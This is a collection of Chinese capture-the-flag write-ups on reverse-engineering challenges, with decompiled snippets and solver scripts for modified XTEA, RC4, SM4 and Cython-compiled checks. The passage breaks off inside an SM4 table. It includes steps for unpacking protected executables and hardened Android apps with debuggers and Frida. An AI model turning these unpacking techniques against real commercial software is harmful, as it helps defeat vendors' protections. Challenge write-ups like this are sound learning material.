[{"title":"2024 国赛 Reverse 方向","url":"/2024/12/03/2024ciscn/","content":"2024 国赛 Reverse 方向\n\n\nReverserand0m得到一个 rand0m.pyd 和 generate.py，rand0m.pyd 被去符号了，先随便写一个 py，然后用 python3.12 的 cython 编译\ndef check(flag):    a = 1 * 1    b = 2 * 2    c = 2 ^ 3    a = [0] * 6    b = 0    while b:        print(\"11\")        b -= 1    rand0m(flag)     return a + b + c + flagdef rand0m(x):    return x ^ 123__test__ = {}\n\nfrom setuptools import setup, Extensionfrom Cython.Build import cythonizeext_module = [    Extension(        name = \"test\",        sources=[\"test.py\"],        extra_compile_args=[\"/Zi\"],        extra_link_args=[\"/DEBUG\"]    )]setup(    name=\"test\",    ext_modules=cythonize(ext_module, annotate=True),)\n\npython build.py build_ext --inplace，用编译后的 pyd 去和 rand0m.pyd bindiff 恢复符号\n\n\n第二步去找那个全局调用表 _pyx_mstate_global，恢复符号后找到 _Pyx_InitStrings_0，里面有 调用表的初始化，先写几个结构体导入 ida\ntypedef struct {    __int64 *__pyx_0;    __int64 *__pyx_1;    __int64 *__pyx_2;    __int64 *__pyx_3;    __int64 *__pyx_4;    __int64 *__pyx_5;    __int64 *__pyx_6;    __int64 *__pyx_7;    __int64 *__pyx_8;    __int64 *__pyx_9;    __int64 *__pyx_10;    __int64 *__pyx_11;    __int64 *__pyx_12;    __int64 *__pyx_13;    __int64 *__pyx_14;    __int64 *__pyx_15;    __int64 *__pyx_16;    __int64 *__pyx_17;    __int64 *__pyx_18;    __int64 *__pyx_19;    __int64 *__pyx_20;    __int64 *__pyx_21;    __int64 *__pyx_22;    __int64 *__pyx_23;    __int64 *__pyx_24;    __int64 *__pyx_25;    __int64 *__pyx_26;    __int64 *__pyx_27;    __int64 *__pyx_28;    __int64 *__pyx_29;    __int64 *__pyx_30;    __int64 *__pyx_31;    __int64 *__pyx_32;    __int64 *__pyx_33;    __int64 *__pyx_34;    __int64 *__pyx_35;    __int64 *__pyx_36;    __int64 *__pyx_37;    __int64 *__pyx_38;    __int64 *__pyx_39;} __pyx_mstate_me;struct __Pyx_StringTabEntry{    __int64 p, s, n, encoding;    __int8 is_unicode, is_str, intern;    __int8 b1, b2, b3, b4, b5;};\n\n导入后手动设置类型，可以恢复大部分 _Pyx_InitStrings_0\n\n\n之后手动 重建结构体\ntypedef struct {    __int64 *__pyx_d;    __int64 *__pyx_b;    __int64 *__pyx_cython_runtime;    __int64 *__pyx_empty_tuple;    __int64 *__pyx_empty_bytes;    __int64 *__pyx_empty_unicode;    __int64 *__pyx_CyFunctionType;    __int64 *__pyx_wenhao;    __int64 *__pyx_asyncio_coroutines;    __int64 *__pyx_check;    __int64 *__pyx__class_getitem__;    __int64 *__pyx_cline_in_traceback;    __int64 *__pyx_delta;    __int64 *__pyx_enc;    __int64 *__pyx_flag;    __int64 *__pyx_i;    __int64 *__pyx__is_coroutine;    __int64 *__pyx___main__;    __int64 *__pyx___name__;    __int64 *__pyx_rand0m;    __int64 *__pyx_rand0m_pyx;    __int64 *__pyx_range;    __int64 *__pyx_ret;    __int64 *__pyx_right;    __int64 *__pyx_seed;    __int64 *__pyx_sum;    __int64 *__pyx___test__;    __int64 *__pyx_tmp;    __int64 *__pyx_x;} __pyx_mstate_me_2;\n\n之后可以开始分析了\n先看 rand0m 下的 rand0m 方法\n找到绑定的函数后\n\n\n这里是一个字符串转int的函数 等于 int(v0, 16)\n\n\n这里这个 v8 这么奇怪其实是被上面我们重建的调用表结构体影响了，这里我们要去找全局初始化整数的地方 _Pyx_CreateStringTabAndInitStrings\n \n \n也可以看到确实是 int(v0, 16)\n明白这些之后接下来只要循规蹈矩的一点点分析就好了\n \n这两句翻译过来就是\ndef rand0m_fake(x):    v6 = x ^ 0x9e3779b9    v3 = x &gt;&gt; 5\n\n \nv22 = (x &lt;&lt; 4) &amp; 0xfa3affff\n\n同样的 rand0m 分析完就是\ndef rand0m_fake(x):    v25 = ((x &lt;&lt; 4) &amp; 0xfa3affff) + (x &gt;&gt; 28)    v27 = (x ^ 0x9e3779b9) &gt;&gt; 11    v27 = v27 ** 65537    v27 %= 0xfffffffd    return (v27, v25)\n\n在分析 check 函数\n \n这里新建一个长度为 8 的密文列表，按照上面的方法设置值后得到\nnums = [0x12287f38, 0x98d24b3a, 0x4a30f74d, 0xe0f1db77, 0x23a1268, 0xadf38403, 0x88108807, 0xd8499bb6]\n\n \n这里是一个数组切片 分析以下就是8个8个切片去加密\n \n然后获得结果后用 PyObject_RichCompare 去和密文比较\n总体就是每次截取8个获得两个密文，然后比较，用 z3 去解\nfor i in range(0, 8, 2):    nums = [0x12287f38, 0x98d24b3a, 0x4a30f74d, 0xe0f1db77, 0x23a1268, 0xadf38403, 0x88108807, 0xd8499bb6]    res = [nums[i + 1], nums[i]]    a = BitVec(\"data\", 32)    s = Solver()    dt = ((a &lt;&lt; 4) &amp; 0xfa3affff) + (a &gt;&gt; 28)    s.add(And(res[1] - 0x10 &lt;= dt, dt &lt;= res[1] + 0x10))    while s.check() == sat:        module = s.model()        result = module[a].as_long()                chec = rand0m.rand0m(hex(result)[2:])        if chec[0] == res[0] and chec[1] == res[1]:            print(f\"{result:#x} {chec[0]:#x} {chec[1]:#x}\")            break        s.add(a != result)\n\n这里奇偶数有误差，所有放大一点，然后可以解出来 flag\n0x813a97f3 0x98d24b3a 0x12287f380xd4b34f74 0xe0f1db77 0x4a30f74d0x802ba126 0xadf38403 0x23a12680x78950880 0xd8499bb6 0x88108807\n\n拼接以下可以得到 flag\nflag{813a97f3d4b34f74802ba12678950880}\ncythonexe 解包后有一个 pyc 和 一个 pyd，pyc 有不支持的 opcode 所以直接看字节码\nfor i in range(len(flag1) - 3):    b = (ord(flag1[i]) &lt;&lt; 24) | (ord(flag1[i + 1]) &lt;&lt; 16) | (ord(flag1[i + 2]) &lt;&lt; 8) | ord(flag1[i + 3])    value.append(b)    i += 4key = [102, 108, 97, 103] flag_encrypt = []print(value)for i in range(6):    res = ez.encrypt(value[i], value[i + 1], key[i % len(key)])    flag_encrypt.append(res)ck = ez.check(flag_encrypt)\n\n翻译过来就是这个\n之后逆向 ez.pyd 前面部分同上，恢复符号后重建调用表\ntypedef struct {    __int64 *__pyx_d;    __int64 *__pyx_b;    __int64 *__pyx_cython_runtime;    __int64 *__pyx_empty_tuple;    __int64 *__pyx_empty_bytes;    __int64 *__pyx_empty_unicode;    __int64 *__pyx_CyFunctionType;    __int64 *__pyx_kp_s_11;    __int64 *__pyx_V0;    __int64 *__pyx_V1;    __int64 *__pyx_wenhao;    __int64 *__pyx_asyncio_coroutines;    __int64 *__pyx_c_uint32;    __int64 *__pyx_check;    __int64 *__pyx__class_getitem__;    __int64 *__pyx_cline_in_traceback;    __int64 *__pyx_ctypes;    __int64 *__pyx_data;    __int64 *__pyx_delta;    __int64 *__pyx_encrypt;    __int64 *__pyx_ez;    __int64 *__pyx_ez_py;    __int64 *__pyx_flag_encrypt;    __int64 *__pyx_i;    __int64 *__pyx___import__;    __int64 *__pyx__is_coroutine;    __int64 *__pyx_key;    __int64 *__pyx___main__;    __int64 *__pyx___name__;    __int64 *__pyx_range;    __int64 *__pyx___test__;    __int64 *__pyx_total;    __int64 *__pyx_zero_v;    __int64 *__pyx_v1;    __int64 *__pyx_value;} __pyx_mstate_me_2;struct __Pyx_StringTabEntry{    __int64 p, s, n, encoding;    __int8 is_unicode, is_str, intern;    __int8 b1, b2, b3, b4, b5;};\n\n然后分析 encrypt\n其实就是一个魔改 xtea，魔改了 delta 轮数 还有移位数\n \n这里就是\nctypes.uint32_t(v0).value\n\n \n这里翻译过来是\nv0 += (((v1 &lt;&lt; 3) ^ (v1 &gt;&gt; 6)) + v1) ^ (sum + key[sum &amp; 3]);\n\n \n这里翻译过来是\nv1 += (((v0 &lt;&lt; 3) ^ (v0 &gt;&gt; 6)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);\n\n \n这里 加了 delta，然后就可以写一个脚本解密了\n#include \"defs.h\"#include \"stdio.h\"#include \"stdint.h\"void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]){    unsigned int i;    uint32_t v0 = v[0], v1 = v[1], delta = 0x54646454, sum = delta * num_rounds;    for (i = 0; i &lt; num_rounds; i++)    {        v1 -= (((v0 &lt;&lt; 3) ^ (v0 &gt;&gt; 6)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);        sum -= delta;        v0 -= (((v1 &lt;&lt; 3) ^ (v1 &gt;&gt; 6)) + v1) ^ (sum + key[sum &amp; 3]);    }    v[0] = v0;    v[1] = v1;}int main(){    uint32 v[] = {            874806256, 3846097014, 2954414927, 947032420, 142915619, 250019369    };    uint32 key[] = {            102, 108, 97, 103    };    for (int i = 0; i &lt; 6; i += 2) {        decipher(64, v + i, key);    }    uint8 *ptr = (uint8 *) v;    for (int i = 0; i &lt; 24; i += 4) {        printf(\"%c%c%c%c\", ptr[i + 3], ptr[i + 2], ptr[i + 1], ptr[i]);    }    return 0;}\n\nflag{bfXtvbVZfRfeqoSXWD}\ndump到手一个 re.exe，随便输入点东西发现会根据你输入的内容给出加密的内容\n \n发现是一个单字节加密，直接输入所有可打印字符串导出表\n0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-./:;&lt;=&gt;?@[\\\\]^_`{|}~ 001c1d000000000000001e1f202122232425262728292a2b2c2d2e2f303132333435363702030405060708090a0b0c0d0e0f101112131415161718191a1b000000000000000000000000000000000100000000000000000038003900\n\nimport binasciis = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-./:;&lt;=&gt;?@[\\\\]^_`{|}~ \"d = list(binascii.unhexlify(\"001c1d000000000000001e1f202122232425262728292a2b2c2d2e2f303132333435363702030405060708090a0b0c0d0e0f101112131415161718191a1b000000000000000000000000000000000100000000000000000038003900\"))mp = {}idx = 0for i in range(len(d)):    mp[d[i]] = s[i]data = open(\"flag\", \"rb\").read()for i in data:    print(mp[i], end=\"\")\n\nflag{MTczMDc~MzQ2Ng==}\n这个 ~ 是因为密文里是 00，而加密后是 00 太多了不知道是什么，这个 flag 包裹的内容很像 base64，先随便填一下，很像时间戳，测试后发现 4 以后的数字还有 英文字母都是无效时间戳，随便爆破下，4是正确答案\nflag{MTczMDc4MzQ2Ng==}\n","tags":["Reverse"]},{"title":"2024 古剑山网络安全大赛 Reverse 方向","url":"/2024/12/03/2024gujianshan/","content":"台州市赛 Reverse 方向\n\n\nipa一血嘻嘻\n\n\nIOS 逆向，直接用 ida 打开分析 里面的 EasyIOS\n\n在程序段下有三个初始化程序，里面把 密文、RC4 的 key、还有 base64 的表都给修改了\ndouble InitFunc_0(){    __int64 v0; // x8    unsigned int v1; // w9    int v2; // w13    int v3; // w9    int v4; // w14    __int64 i; // x9    double result; // d0    __int128 v7[2]; // [xsp+0h] [xbp-90h]    __int128 v8; // [xsp+20h] [xbp-70h]    __int128 v9; // [xsp+30h] [xbp-60h]    v0 = 0LL;    v1 = 0;    unsigned char v10[64] = {            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,            0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,            0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,            0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F    };    do    {        v2 = v10[v0];        v3 = v1 + v2 + byte_100007F00[(unsigned __int8)v0 % 5u];        v4 = v3 + 63;        if ( v3 &gt;= 0 )            v4 = v3;        v1 = v3 - (v4 &amp; 0xFFFFFFC0);        v10[v0] = v10[v1];        v10[v1] = v2;        ++v0;    }    while ( v0 != 64 );    for (int j = 0; j &lt; 64; ++j) {        printf(\"%c\", aAbcdefghijklmn[v10[j]]);    }    return result;}\n\n可以得到码表 NF01ihUKST9q3lnjEBs47k2w5ad+AVHfPezg/CDyxrMLR6GvomIQJOXcpW8ZbutY\n\n\n\n\n得到 base 后的密文 bExa9y+XlAbleJPlBJy5r0AFPeJQKEODCQ6D23jOpR+X接下来写一下脚本就行了\n#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include \"defs.h\"uint8 sbox[250] = {0};//初始化s表void init_sbox(char *key, int klen) {    uint64 i, k;    int64 tmp;    for (i = 0; i &lt; 250; i++) {        sbox[i] = i;    }    uint64 j = 0;    for (i = 0; i &lt; 250; i++) {        tmp = (uint8) sbox[i];        int64 v13 = j + tmp;        char keyVal = key[i % klen];        int bitFlag = keyVal &amp; 0x80;        uint64 covertVal = 0;        if (bitFlag) {            // 负数            covertVal = 0xFFFFFFFFFFFFFF00 | keyVal;        } else {            covertVal = keyVal;        }        j = (v13 + covertVal) % 250;        sbox[i] = sbox[j];        sbox[j] = tmp;    }}//加解密函数void enc_dec(char *key, unsigned char *data, int slen, int klen) {    int i, j, k, R, tmp;    init_sbox(key, klen);//    for (int l = 0; l &lt; 250; ++l) {//        printf(\"0x%x, \", (uint8) sbox[l]);//    }    j = k = 0;    for (i = 0; i &lt; slen; i++) {        j = (j + 1) % 250;        k = (k + sbox[j]) % 250;        tmp = sbox[j];        sbox[j] = sbox[k];        sbox[k] = tmp;        R = sbox[(sbox[j] + sbox[k]) % 250];        data[i] ^= R;    }}int main() {    unsigned char key[13] = {0xF6, 0xCC, 0xC8, 0xD5, 0xC9, 0xC0, 0xEE, 0xC0, 0xDC, 0xED, 0xC0, 0xD7, 0xC0};    unsigned char data[33] = {0xf1,0x0a,0x19,0x2a,0x76,0xf6,0x35,0xcf,0x0d,0x87,0x48,0x0d,0x47,0x49,0xd8,0xa4,0x27,0x01,0x82,0x1d,0x33,0x1d,0x0d,0x66,0x97,0x3b,0x66,0x58,0xc3,0xf5,0xe2,0xc6,0xf6};    enc_dec((char *)key, data, 33, 13);    for (int i = 0; i &lt; 33; ++i) {        printf(\"%c\", data[i]);    }    return 0;}// flag{45_4_105_r3v3r51n6_b361nn3r}\n\n这里有个问题就是这道题中的 RC4 在取 key 的时候用的是有符号字节拓展（LDRSB 指令），原本如果取模模的是 256 也就是 0xFF 那倒是不会出啥问题，但是这里模的是 250，就会导致出一点问题，得 key[i % klen] 取出来后强转成 int64 再加回去\n\nez_re发现有个壳，用 x32dbg 调试，下断点在 VirtualProtect 运行几次然后单步走两下断在程序段\n\n然后用 Scylla dump fix，拉进 ida 分析手动重命名一下函数后发现，就是一个替换\n\n\n直接把伪C拉下来，改一下判断，加上打印就可以得到 Flag\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include \"defs.h\"unsigned char key_table[10] = {        0x7B, 0x64, 0x65, 0x32, 0x31, 0x63, 0x7A, 0x34, 0x79, 0x00};BOOL __fastcall sub_3B1150(char *v5_cp, char *v4_cp){    char *v2; // edi    int v4; // esi    char v5; // al    int v6; // esi    int v7; // ecx    char v8; // dl    char v9; // al    int v10; // edx    char v11; // cl    char v12; // al    v2 = v4_cp + 24;                              // flag开头    v4 = 0;    while ( 1 )    {        v5 = *v2++;        printf(\"%c\", v5);        if ( ++v4 &gt;= 4 )        {            v6 = 4;            v7 = 0;            while ( 1 )            {                v8 = key_table[v7];                if ( v8 == 121 )                {                    key_table[v7] = 55;                    v8 = 55;                }                if ( v8 == 122 )                {                    key_table[v7] = 56;                    v8 = 56;                }                v6++;                printf(\"%c\", v8);                if ( ++v7 &gt;= 9 )                {                    v10 = 0;                    while ( 1 )                    {                        v11 = v4_cp[v10];                        if ( v11 == 121 )                        {                            v4_cp[v10] = 55;                            v11 = 55;                        }                        if ( v11 == 122 )                        {                            v4_cp[v10] = 56;                            v11 = 56;                        }                        v6++;                        printf(\"%c\", v11);                        if ( ++v10 &gt;= 24 ) {                            printf(\"}\");                            return 1;                        }                    }                }            }        }    }}int main() {    char pt[] = \"cedfz16az31zd2dycy65ac41flag\";    sub_3B1150(pt, pt);    return 0;}// flag{de21c847cedf816a8318d2d7c765ac41}\n","tags":["Reverse"]},{"title":"金融密码杯 - Reverse 方向","url":"/2024/11/20/2024jinrongmima/","content":"金融密码杯 Reverse 方向\n\n\nappetizer解法1有邦邦加固，先用 frida-dexdump 脱壳，然后发现有个 JNI\n\nlibnative-lib.so 有 SMC 所以选择用 frida 脱壳，修复 so 之后发现是一个魔改 SM4\n轮密钥生成\n\n加密部分\n\n\n这里长得那么奇怪是因为用了预先算出来的盒加速了，可以拉一份 openssl 的脚本\n#include \"stdlib.h\"#include \"ctype.h\"#include \"stdio.h\"#include \"string.h\"typedef unsigned char uint8_t;typedef unsigned int uint32_t;#define SM4_ENCRYPT 1#define SM4_DECRYPT 0#define SM4_BLOCK_SIZE 16#define SM4_KEY_SCHEDULE 32typedef struct SM4_KEY_st{    uint32_t rk[SM4_KEY_SCHEDULE];} SM4_KEY;static const uint8_t SM4_S[256] = {    0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2,    0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3,    0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4,    0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62,    0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA,    0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA,    0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2,    0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35,    0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B,    0x01, 0x21, 0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52,    0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2,    0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1,    0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30,    0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60,    0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45,    0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51,    0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41,    0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD,    0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A,    0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84,    0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E,    0xD7, 0xCB, 0x39, 0x48};/* * SM4_SBOX_T[j] == L(SM4_SBOX[j]). */static const uint32_t SM4_SBOX_T0[256] = {    0x8ED55B5B, 0xD0924242, 0x4DEAA7A7, 0x06FDFBFB, 0xFCCF3333, 0x65E28787,    0xC93DF4F4, 0x6BB5DEDE, 0x4E165858, 0x6EB4DADA, 0x44145050, 0xCAC10B0B,    0x8828A0A0, 0x17F8EFEF, 0x9C2CB0B0, 0x11051414, 0x872BACAC, 0xFB669D9D,    0xF2986A6A, 0xAE77D9D9, 0x822AA8A8, 0x46BCFAFA, 0x14041010, 0xCFC00F0F,    0x02A8AAAA, 0x54451111, 0x5F134C4C, 0xBE269898, 0x6D482525, 0x9E841A1A,    0x1E061818, 0xFD9B6666, 0xEC9E7272, 0x4A430909, 0x10514141, 0x24F7D3D3,    0xD5934646, 0x53ECBFBF, 0xF89A6262, 0x927BE9E9, 0xFF33CCCC, 0x04555151,    0x270B2C2C, 0x4F420D0D, 0x59EEB7B7, 0xF3CC3F3F, 0x1CAEB2B2, 0xEA638989,    0x74E79393, 0x7FB1CECE, 0x6C1C7070, 0x0DABA6A6, 0xEDCA2727, 0x28082020,    0x48EBA3A3, 0xC1975656, 0x80820202, 0xA3DC7F7F, 0xC4965252, 0x12F9EBEB,    0xA174D5D5, 0xB38D3E3E, 0xC33FFCFC, 0x3EA49A9A, 0x5B461D1D, 0x1B071C1C,    0x3BA59E9E, 0x0CFFF3F3, 0x3FF0CFCF, 0xBF72CDCD, 0x4B175C5C, 0x52B8EAEA,    0x8F810E0E, 0x3D586565, 0xCC3CF0F0, 0x7D196464, 0x7EE59B9B, 0x91871616,    0x734E3D3D, 0x08AAA2A2, 0xC869A1A1, 0xC76AADAD, 0x85830606, 0x7AB0CACA,    0xB570C5C5, 0xF4659191, 0xB2D96B6B, 0xA7892E2E, 0x18FBE3E3, 0x47E8AFAF,    0x330F3C3C, 0x674A2D2D, 0xB071C1C1, 0x0E575959, 0xE99F7676, 0xE135D4D4,    0x661E7878, 0xB4249090, 0x360E3838, 0x265F7979, 0xEF628D8D, 0x38596161,    0x95D24747, 0x2AA08A8A, 0xB1259494, 0xAA228888, 0x8C7DF1F1, 0xD73BECEC,    0x05010404, 0xA5218484, 0x9879E1E1, 0x9B851E1E, 0x84D75353, 0x00000000,    0x5E471919, 0x0B565D5D, 0xE39D7E7E, 0x9FD04F4F, 0xBB279C9C, 0x1A534949,    0x7C4D3131, 0xEE36D8D8, 0x0A020808, 0x7BE49F9F, 0x20A28282, 0xD4C71313,    0xE8CB2323, 0xE69C7A7A, 0x42E9ABAB, 0x43BDFEFE, 0xA2882A2A, 0x9AD14B4B,    0x40410101, 0xDBC41F1F, 0xD838E0E0, 0x61B7D6D6, 0x2FA18E8E, 0x2BF4DFDF,    0x3AF1CBCB, 0xF6CD3B3B, 0x1DFAE7E7, 0xE5608585, 0x41155454, 0x25A38686,    0x60E38383, 0x16ACBABA, 0x295C7575, 0x34A69292, 0xF7996E6E, 0xE434D0D0,    0x721A6868, 0x01545555, 0x19AFB6B6, 0xDF914E4E, 0xFA32C8C8, 0xF030C0C0,    0x21F6D7D7, 0xBC8E3232, 0x75B3C6C6, 0x6FE08F8F, 0x691D7474, 0x2EF5DBDB,    0x6AE18B8B, 0x962EB8B8, 0x8A800A0A, 0xFE679999, 0xE2C92B2B, 0xE0618181,    0xC0C30303, 0x8D29A4A4, 0xAF238C8C, 0x07A9AEAE, 0x390D3434, 0x1F524D4D,    0x764F3939, 0xD36EBDBD, 0x81D65757, 0xB7D86F6F, 0xEB37DCDC, 0x51441515,    0xA6DD7B7B, 0x09FEF7F7, 0xB68C3A3A, 0x932FBCBC, 0x0F030C0C, 0x03FCFFFF,    0xC26BA9A9, 0xBA73C9C9, 0xD96CB5B5, 0xDC6DB1B1, 0x375A6D6D, 0x15504545,    0xB98F3636, 0x771B6C6C, 0x13ADBEBE, 0xDA904A4A, 0x57B9EEEE, 0xA9DE7777,    0x4CBEF2F2, 0x837EFDFD, 0x55114444, 0xBDDA6767, 0x2C5D7171, 0x45400505,    0x631F7C7C, 0x50104040, 0x325B6969, 0xB8DB6363, 0x220A2828, 0xC5C20707,    0xF531C4C4, 0xA88A2222, 0x31A79696, 0xF9CE3737, 0x977AEDED, 0x49BFF6F6,    0x992DB4B4, 0xA475D1D1, 0x90D34343, 0x5A124848, 0x58BAE2E2, 0x71E69797,    0x64B6D2D2, 0x70B2C2C2, 0xAD8B2626, 0xCD68A5A5, 0xCB955E5E, 0x624B2929,    0x3C0C3030, 0xCE945A5A, 0xAB76DDDD, 0x867FF9F9, 0xF1649595, 0x5DBBE6E6,    0x35F2C7C7, 0x2D092424, 0xD1C61717, 0xD66FB9B9, 0xDEC51B1B, 0x94861212,    0x78186060, 0x30F3C3C3, 0x897CF5F5, 0x5CEFB3B3, 0xD23AE8E8, 0xACDF7373,    0x794C3535, 0xA0208080, 0x9D78E5E5, 0x56EDBBBB, 0x235E7D7D, 0xC63EF8F8,    0x8BD45F5F, 0xE7C82F2F, 0xDD39E4E4, 0x68492121};static uint32_t SM4_SBOX_T1[256] = {    0x5B8ED55B, 0x42D09242, 0xA74DEAA7, 0xFB06FDFB, 0x33FCCF33, 0x8765E287,    0xF4C93DF4, 0xDE6BB5DE, 0x584E1658, 0xDA6EB4DA, 0x50441450, 0x0BCAC10B,    0xA08828A0, 0xEF17F8EF, 0xB09C2CB0, 0x14110514, 0xAC872BAC, 0x9DFB669D,    0x6AF2986A, 0xD9AE77D9, 0xA8822AA8, 0xFA46BCFA, 0x10140410, 0x0FCFC00F,    0xAA02A8AA, 0x11544511, 0x4C5F134C, 0x98BE2698, 0x256D4825, 0x1A9E841A,    0x181E0618, 0x66FD9B66, 0x72EC9E72, 0x094A4309, 0x41105141, 0xD324F7D3,    0x46D59346, 0xBF53ECBF, 0x62F89A62, 0xE9927BE9, 0xCCFF33CC, 0x51045551,    0x2C270B2C, 0x0D4F420D, 0xB759EEB7, 0x3FF3CC3F, 0xB21CAEB2, 0x89EA6389,    0x9374E793, 0xCE7FB1CE, 0x706C1C70, 0xA60DABA6, 0x27EDCA27, 0x20280820,    0xA348EBA3, 0x56C19756, 0x02808202, 0x7FA3DC7F, 0x52C49652, 0xEB12F9EB,    0xD5A174D5, 0x3EB38D3E, 0xFCC33FFC, 0x9A3EA49A, 0x1D5B461D, 0x1C1B071C,    0x9E3BA59E, 0xF30CFFF3, 0xCF3FF0CF, 0xCDBF72CD, 0x5C4B175C, 0xEA52B8EA,    0x0E8F810E, 0x653D5865, 0xF0CC3CF0, 0x647D1964, 0x9B7EE59B, 0x16918716,    0x3D734E3D, 0xA208AAA2, 0xA1C869A1, 0xADC76AAD, 0x06858306, 0xCA7AB0CA,    0xC5B570C5, 0x91F46591, 0x6BB2D96B, 0x2EA7892E, 0xE318FBE3, 0xAF47E8AF,    0x3C330F3C, 0x2D674A2D, 0xC1B071C1, 0x590E5759, 0x76E99F76, 0xD4E135D4,    0x78661E78, 0x90B42490, 0x38360E38, 0x79265F79, 0x8DEF628D, 0x61385961,    0x4795D247, 0x8A2AA08A, 0x94B12594, 0x88AA2288, 0xF18C7DF1, 0xECD73BEC,    0x04050104, 0x84A52184, 0xE19879E1, 0x1E9B851E, 0x5384D753, 0x00000000,    0x195E4719, 0x5D0B565D, 0x7EE39D7E, 0x4F9FD04F, 0x9CBB279C, 0x491A5349,    0x317C4D31, 0xD8EE36D8, 0x080A0208, 0x9F7BE49F, 0x8220A282, 0x13D4C713,    0x23E8CB23, 0x7AE69C7A, 0xAB42E9AB, 0xFE43BDFE, 0x2AA2882A, 0x4B9AD14B,    0x01404101, 0x1FDBC41F, 0xE0D838E0, 0xD661B7D6, 0x8E2FA18E, 0xDF2BF4DF,    0xCB3AF1CB, 0x3BF6CD3B, 0xE71DFAE7, 0x85E56085, 0x54411554, 0x8625A386,    0x8360E383, 0xBA16ACBA, 0x75295C75, 0x9234A692, 0x6EF7996E, 0xD0E434D0,    0x68721A68, 0x55015455, 0xB619AFB6, 0x4EDF914E, 0xC8FA32C8, 0xC0F030C0,    0xD721F6D7, 0x32BC8E32, 0xC675B3C6, 0x8F6FE08F, 0x74691D74, 0xDB2EF5DB,    0x8B6AE18B, 0xB8962EB8, 0x0A8A800A, 0x99FE6799, 0x2BE2C92B, 0x81E06181,    0x03C0C303, 0xA48D29A4, 0x8CAF238C, 0xAE07A9AE, 0x34390D34, 0x4D1F524D,    0x39764F39, 0xBDD36EBD, 0x5781D657, 0x6FB7D86F, 0xDCEB37DC, 0x15514415,    0x7BA6DD7B, 0xF709FEF7, 0x3AB68C3A, 0xBC932FBC, 0x0C0F030C, 0xFF03FCFF,    0xA9C26BA9, 0xC9BA73C9, 0xB5D96CB5, 0xB1DC6DB1, 0x6D375A6D, 0x45155045,    0x36B98F36, 0x6C771B6C, 0xBE13ADBE, 0x4ADA904A, 0xEE57B9EE, 0x77A9DE77,    0xF24CBEF2, 0xFD837EFD, 0x44551144, 0x67BDDA67, 0x712C5D71, 0x05454005,    0x7C631F7C, 0x40501040, 0x69325B69, 0x63B8DB63, 0x28220A28, 0x07C5C207,    0xC4F531C4, 0x22A88A22, 0x9631A796, 0x37F9CE37, 0xED977AED, 0xF649BFF6,    0xB4992DB4, 0xD1A475D1, 0x4390D343, 0x485A1248, 0xE258BAE2, 0x9771E697,    0xD264B6D2, 0xC270B2C2, 0x26AD8B26, 0xA5CD68A5, 0x5ECB955E, 0x29624B29,    0x303C0C30, 0x5ACE945A, 0xDDAB76DD, 0xF9867FF9, 0x95F16495, 0xE65DBBE6,    0xC735F2C7, 0x242D0924, 